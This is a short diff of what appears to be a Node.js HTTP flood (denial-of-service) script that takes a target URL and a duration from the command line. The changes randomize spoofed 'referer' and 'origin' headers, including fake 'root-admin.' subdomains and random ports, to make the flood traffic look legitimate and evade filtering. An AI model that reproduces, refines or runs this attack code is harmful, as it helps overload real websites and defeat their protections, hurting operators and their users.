@@ -63,7 +63,6 @@ const secureContextOptions = {
 const secureContext = tls.createSecureContext(secureContextOptions);
 if (cluster.isMaster) {
 	console.clear()
-	console.log('p')
 	console.log(`--------------------------------------------`)
 	console.log(`Target: ` + process.argv[2])
 	console.log(`Time: ` + process.argv[3])
@@ -412,8 +411,8 @@ const bexHeaders5 = [
   { "purpose": "prefetch" },
 ];
 let bexHeaders = {
-"referer": Math.random() < 0.5 ? Math.random() < 0.5 ? "https://" + Ref + (Math.random() < 0.5 ? ":" + Math.floor(Math.random() * 65535 + 1) + '/' : '@root/') : "https://" + (Math.random() < 0.5 ? 'root-admin.' : 'root-root.') + Ref : Math.random() < 0.5 ? 'https://' + Ref : 'https://' + Ref + `/${["index", "home", "login", "register"][Math.floor(Math.random() * 4)]}`,
-"origin": "https://" + Ref,
+"referer": "https://" + Ref + parsedTarget.path,
+"origin": Math.random() < 0.5 ? "https://" + Ref + (Math.random() < 0.5 ? ":" + Math.floor(Math.random() * 65535 + 1) + '/' : '@root/') : "https://" + (Math.random() < 0.5 ? 'root-admin.' : 'root-root.') + Ref,
 ...(Math.random() < 0.5 ?{"x-build-id" : randstr(5)} : {['x-content-type-options']: 'nosniff'}),
 ...(Math.random() < 0.5 ?{"if-modified-since": getRandomDate().toUTCString()} :{}),
 ...(Math.random() < 0.75 ?{"upgrade-insecure-requests": "1"} : {}),
